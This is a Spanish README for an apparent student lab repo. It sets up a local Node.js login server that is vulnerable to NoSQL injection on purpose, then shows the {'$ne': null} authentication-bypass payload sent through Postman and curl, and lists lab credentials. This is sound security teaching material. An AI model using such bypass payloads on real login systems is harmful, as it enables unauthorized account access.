Nosql inyection

Instalacion y uso en linux o windows

Clona el repo
Abre la terminal y escribe esto
git clone https://github.com/JavierNila/NoSQL-Inyection.git
cd NoSQL Inyection

Instala lo que necesita
Dentro de la carpeta del proyecto
npm install
npm install cors
Eso va a descargar todas las cosas necesarias El cors es para que el navegador no se queje

Corre el servidor
Lanzalo con
node server.js
Va a estar corriendo en http://localhost:3000

Abre el frontend
Abre el archivo index.html en tu navegador

Como se usa
Escribes un usuario y contraseña en la pagina la de index.html

Le das a ingresar y eso manda los datos al backend en http://localhost:3000/login

Si quieres probar inyecciones nosql puedes usar postman o directamente desde la terminal con curl

Postman
Abres postman haces un post a http://localhost:3000/login
Vas a body eliges raw y formato json
Pegas esto

{ "username": { "$ne": null }, "password": { "$ne": null } }

Y le das enviar, deberia entrar sin usar credenciales reales

Si prefiere terminal escribir esto
curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": { "$ne": null }, "password": { "$ne": null }}'

Y listo, te deja entrar por la vulnerabilidad de nosql injection

Importante
Las credenciales que nos otorgaron (username: student, password: dPgF0sb0ADBUZHCI) no funcionan
